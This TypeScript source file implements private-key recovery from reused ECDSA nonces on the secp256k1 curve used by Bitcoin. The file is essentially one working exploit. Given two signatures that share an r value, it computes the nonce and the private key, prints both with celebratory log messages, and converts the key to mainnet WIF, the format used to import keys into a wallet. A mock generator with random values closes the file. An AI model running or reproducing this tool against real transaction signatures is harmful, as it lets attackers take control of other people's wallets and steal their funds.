
import * as crypto from 'crypto';

interface ECDSASignature {
  r: string;
  s: string;
  hashType: number;
  der: string;
}

interface SignaturePair {
  sig1: ECDSASignature;
  sig2: ECDSASignature;
  hash1: string;
  hash2: string;
  txid1: string;
  txid2: string;
}

export class PrivateKeyRecovery {
  // Secp256k1 curve parameters
  private static readonly CURVE_ORDER = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
  private static readonly CURVE_P = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F');

  static async recoverPrivateKeyFromReuse(signaturePair: SignaturePair): Promise<{
    privateKeyHex: string;
    privateKeyWIF: string;
    success: boolean;
    error?: string;
  }> {
    try {
      const r = BigInt('0x' + signaturePair.sig1.r);
      const s1 = BigInt('0x' + signaturePair.sig1.s);
      const s2 = BigInt('0x' + signaturePair.sig2.s);
      
      // Convert message hashes to BigInt
      const hash1 = BigInt('0x' + signaturePair.hash1);
      const hash2 = BigInt('0x' + signaturePair.hash2);

      // Check if r values are the same (required for this attack)
      if (signaturePair.sig1.r !== signaturePair.sig2.r) {
        return {
          privateKeyHex: '',
          privateKeyWIF: '',
          success: false,
          error: 'R values are not the same - cannot recover private key'
        };
      }

      // Calculate k (nonce) using the formula: k = (hash1 - hash2) / (s1 - s2) mod n
      const hashDiff = this.modSub(hash1, hash2, this.CURVE_ORDER);
      const sDiff = this.modSub(s1, s2, this.CURVE_ORDER);
      
      if (sDiff === BigInt(0)) {
        return {
          privateKeyHex: '',
          privateKeyWIF: '',
          success: false,
          error: 'S values are the same - cannot recover private key'
        };
      }

      const sDiffInv = this.modInverse(sDiff, this.CURVE_ORDER);
      const k = this.modMul(hashDiff, sDiffInv, this.CURVE_ORDER);

      // Calculate private key using: privateKey = (s1 * k - hash1) / r mod n
      const sk = this.modMul(s1, k, this.CURVE_ORDER);
      const skMinusHash = this.modSub(sk, hash1, this.CURVE_ORDER);
      const rInv = this.modInverse(r, this.CURVE_ORDER);
      const privateKey = this.modMul(skMinusHash, rInv, this.CURVE_ORDER);

      // Validate the private key is in valid range
      if (privateKey <= BigInt(0) || privateKey >= this.CURVE_ORDER) {
        return {
          privateKeyHex: '',
          privateKeyWIF: '',
          success: false,
          error: 'Recovered private key is out of valid range'
        };
      }

      const privateKeyHex = privateKey.toString(16).padStart(64, '0');
      const privateKeyWIF = this.privateKeyToWIF(privateKeyHex);

      console.log(`🔓 Private key recovered successfully!`);
      console.log(`📋 Private Key (Hex): ${privateKeyHex}`);
      console.log(`🔑 Private Key (WIF): ${privateKeyWIF}`);

      return {
        privateKeyHex,
        privateKeyWIF,
        success: true
      };

    } catch (error) {
      console.error('Error recovering private key:', error);
      return {
        privateKeyHex: '',
        privateKeyWIF: '',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error occurred'
      };
    }
  }

  // Modular arithmetic helpers
  private static modAdd(a: bigint, b: bigint, mod: bigint): bigint {
    return ((a % mod) + (b % mod)) % mod;
  }

  private static modSub(a: bigint, b: bigint, mod: bigint): bigint {
    return ((a % mod) - (b % mod) + mod) % mod;
  }

  private static modMul(a: bigint, b: bigint, mod: bigint): bigint {
    return ((a % mod) * (b % mod)) % mod;
  }

  private static modInverse(a: bigint, mod: bigint): bigint {
    return this.modPow(a, mod - BigInt(2), mod);
  }

  private static modPow(base: bigint, exp: bigint, mod: bigint): bigint {
    let result = BigInt(1);
    base = base % mod;
    
    while (exp > BigInt(0)) {
      if (exp % BigInt(2) === BigInt(1)) {
        result = (result * base) % mod;
      }
      exp = exp >> BigInt(1);
      base = (base * base) % mod;
    }
    
    return result;
  }

  // Convert private key to WIF format
  private static privateKeyToWIF(privateKeyHex: string): string {
    try {
      // Add version byte (0x80 for mainnet)
      const extended = '80' + privateKeyHex;
      
      // Calculate checksum (first 4 bytes of double SHA256)
      const hash1 = crypto.createHash('sha256').update(Buffer.from(extended, 'hex')).digest();
      const hash2 = crypto.createHash('sha256').update(hash1).digest();
      const checksum = hash2.subarray(0, 4).toString('hex');
      
      // Combine extended key with checksum
      const fullHex = extended + checksum;
      
      // Convert to Base58
      return this.base58Encode(Buffer.from(fullHex, 'hex'));
    } catch (error) {
      console.error('Error converting to WIF:', error);
      return 'WIF_CONVERSION_ERROR';
    }
  }

  // Simple Base58 encoding
  private static base58Encode(buffer: Buffer): string {
    const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let num = BigInt('0x' + buffer.toString('hex'));
    let encoded = '';
    
    while (num > 0) {
      const remainder = Number(num % BigInt(58));
      encoded = alphabet[remainder] + encoded;
      num = num / BigInt(58);
    }
    
    // Handle leading zeros
    for (let i = 0; i < buffer.length && buffer[i] === 0; i++) {
      encoded = '1' + encoded;
    }
    
    return encoded;
  }

  // Generate mock signature pairs for testing
  static generateMockReuseScenario(): SignaturePair {
    // This creates a realistic scenario with same r but different s values
    const sharedR = crypto.randomBytes(32).toString('hex');
    
    return {
      sig1: {
        r: sharedR,
        s: crypto.randomBytes(32).toString('hex'),
        hashType: 1,
        der: 'mock_der_1'
      },
      sig2: {
        r: sharedR,
        s: crypto.randomBytes(32).toString('hex'),
        hashType: 1,
        der: 'mock_der_2'
      },
      hash1: crypto.createHash('sha256').update('transaction1').digest('hex'),
      hash2: crypto.createHash('sha256').update('transaction2').digest('hex'),
      txid1: crypto.randomBytes(32).toString('hex'),
      txid2: crypto.randomBytes(32).toString('hex')
    };
  }
}
